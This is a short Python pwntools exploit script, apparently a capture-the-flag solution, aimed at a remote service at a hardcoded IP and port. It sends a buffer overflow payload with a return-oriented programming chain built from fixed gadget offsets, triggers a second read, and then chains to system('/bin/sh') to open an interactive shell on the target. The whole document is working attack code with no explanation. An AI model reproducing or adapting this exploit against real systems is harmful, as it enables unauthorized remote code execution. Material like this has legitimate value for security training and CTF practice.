#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 9999
port = 23222
host = "202.120.7.214"

r = remote(host,port)
base= 0x5555e000
#inc_esi_int_0x80 = base + 0x00109176
pop_ebp = base + 0x0001706f
pop_ebx = base + 0x0001934e
xor_ebx_ebp = base + 0x000d564b
add_esp = base + 0x68f5c
inc_esi_int_0x80 = base + 0xb9325
int_80 = base + 0x5561658e
xor_eax_ret_esp_12 = base +  0x00055670
inc_eax_esp_44 = base + 0x00019e45
inc_eax = base + 0x00168864
payload = "a"*32
rop = p32(xor_eax_ret_esp_12)*4
rop += p32(inc_eax)
rop += p32(inc_eax)
rop += p32(inc_eax)
rop += p32(pop_ebp)
rop += "aaaa"
rop += p32(pop_ebx)
rop += "aaaa"
rop += p32(xor_ebx_ebp)
rop += p32(inc_esi_int_0x80) # call read to rop again 
rop += p32(add_esp)
payload += rop
print payload
r.recvuntil("GO : )")
r.sendline(payload)
system = base + 0x00b85e0
sh = base + 0x15d7ec
ret = base + 0x17070 
payload = "a"*92
payload += p32(ret)*30 + p32(system)*2 + p32(sh) + p32(0)*3 # rop
r.send(payload)
r.interactive()

